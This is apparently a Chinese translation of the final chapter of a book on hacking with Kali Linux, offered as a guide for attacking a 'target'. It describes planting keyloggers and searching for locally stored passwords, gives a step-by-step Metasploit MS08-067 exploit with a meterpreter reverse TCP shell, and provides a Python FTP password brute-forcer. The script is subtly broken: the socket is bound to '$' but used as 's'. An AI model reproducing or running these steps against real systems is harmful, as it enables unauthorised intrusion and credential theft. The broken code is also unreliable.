  trans: "\n\n如果你选择不处理上面提到的某些破解工具，我们还有其他一些技术可以采用，包括：\n\n### 1. 击键记录 (Keystroke logging)\n\
    \n我们在上面查看了如何创建我们自己的按键记录器，你会发现，如果你能够将其植入目标系统中，这将是破解该目标已知密码之一的一种高效且简单的方法。\n\n这是因为按键记录器将在目标计算机上安装一种录制设备，然后在将这些信息发送给你之前，开始跟踪他们使用的所有按键。\n\
    \n### 2. 寻找一些较弱的密码存储选项\n\n有很多不安全的应用程序尝试将密码存储在本地位置。\n\n这将使得黑客非常容易地收集这些信息，而无需费费精力。\n\
    \n一旦你获得了目标计算机的物理访问权限，你会发现只需快速搜索即可获取这些密码。\n\n### 3. 以远程方式获取密码\n\n如果你发现无法获得目标计算机的物理访问（这对大多数黑客来说都是事实），那么通过远程进行收集是可能的。\n\
    \n你可能需要使用欺骗攻击来实现这一点，然后利用 `SAM` 文件的漏洞。\n\n用于实现这一点的良好工具是 `Metasploit`，因为它可以帮助我们从目标以及你正在使用的设备中获取所需的\
    \ `IP` 地址。\n\n然后你可以获取这些地址并进行交换，使系统认为你就是本该在系统上的用户。\n\n我们需要实现这一点的代码包括：\n\n1. 打开\
    \ `Metasploit` 并输入命令 `msf > use exploit/windows/smb/ms08_067_netapi`。\n2. 成功后，输入此命令\
    \ `msf(ms08_067_netapi) > set payload /windows/meterpreter/reverse_tcp`。\n3. 在拿到两个\
    \ `IP` 地址后，你输入这些命令来利用这些 `IP` 地址：\n    - `msf (ms08_067_netapi) > set RHOST [这是目标\
    \ IP 地址]`\n    - `msf (ms08_067_netapi) > set LHOST [这是你的 IP 地址]`\n4. 现在是时候输入下面的命令来执行你想做的漏洞利用了：\n\
    \    - `msf (ms08_067_netapi) > exploit`\n5. 这将为你提供一个终端提示符，让你更容易获得所需的远程访问，以便针对目标计算机并执行你想做的操作。\n\
    \n系统会认为你属于那里，因为你拥有正确的 `IP` 地址，你可以访问许多你不应该访问的信息。\n\n## 如何创建我们自己的密码破解器\n\n我们在这里要查看并学习的最后一件事是创建一个我们自己的密码破解器。\n\
    \n这是一个非常好用的工具，特别是当你无法通过社会工程学成功，且目标不会安装你计划使用的按键记录器时。\n\n我们可以将此密码破解器与 `Python` 语言结合使用，使其工作并确保在成功时我们能够收集到所需的信息和密码。\n\
    \n特别，我们将花费一些时间查看创建 FTP 密码破解器的步骤。\n\n这是一个很好用的工具，因为它让我们很容易就能获取到想要的密码，或者确保我们添加到系统中的某些密码尽可能安全。\n\
    \n为了帮助我们开始，我们需要打开 `Kali` 操作系统，然后确保文本编辑器也已就绪。当完成所有这些设置后，你可以输入以下代码来帮助准备好该 FTP 密码破解器：\n\
    \n```python\n#!/usr/bin/python\n\nimport socket\nimport re\nimport sys\n\ndef\
    \ connect(username, password):\n    $ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\
    \    print(\"(*) Trying\"+username+\".\"+password)\n    s.connect(('192.168.1.105',\
    \ 21))\n    data = s.recv(1024)\n    s.send('USER'+username+'\\n')\n    data =\
    \ s.recv(1024)\n    s.send('PASS'+password+'\\r\\n')\n    data = s.recv(3)\n \
    \   s.send('QUIT\\r\\n')\n    s.close()\n    return data\n\nusername = \"NuilByte\"\
    \npasswords=[\"test\", \"backup\", \"password\", \"12345\", \"root\", \"administrator\"\
    , \"ftp\", \"admin\"]\n\nfor password in passwords:\n    attempt = connect(username,\
    \ password)\n    if attempt == \"230\":\n        print(\"[*) Password found:\"\
    \ + password)\n        sys.exit(0)\n```\n\n注意，在此内部，我们导入了一些 `Python` 模块，即 `socket`、`re`\
    \ 和 `sys`，然后我们创建了一个 `socket`，通过端口 `21` 连接到你选择的特定 `IP` 地址。\n\n然后我们为 `username`\
    \ 创建了一个变量并将其赋值为 `NullByte`，接着创建了一个名为 `passwords` 的列表。\n\n这包含了一些可能的密码，然后使用循环来尝试所有密码，直到遍历完列表且没有看到成功为止。\n\
    \n现在，当你过完这部分时，你可能会注意到你可以进行一些更改，特别是当涉及到脚本内部的值时。\n\n你可以第一次这样尝试，以获得对编码及其所提供功能的经验。但随后，当你准备好进行自己的攻击并且对这种工作原理更加熟悉时，进行其中的一些更改并让系统按你想要的方式运行将变得更容易。\n\
    \n当你已经有机会对上面的代码进行你想要的某些更改，以便你的密码破解器按你想要运行，或者即使你只是决定使用上面的代码，也是时候保存它了。\n\n实现此点的最好方法将其命名为\
    \ `ftpcracker.py`，然后赋予所有正确的权限以便运行它。\n\n# 结论\n\n感谢你读完《使用 Kali Linux 进行黑客攻击》，希望它对你有启发性，并为你提供了实现目标所需的所有工具，无论你的目标是什么。\n\
    \n下一步是尽快开始你自己的黑客冒险！\n\n"
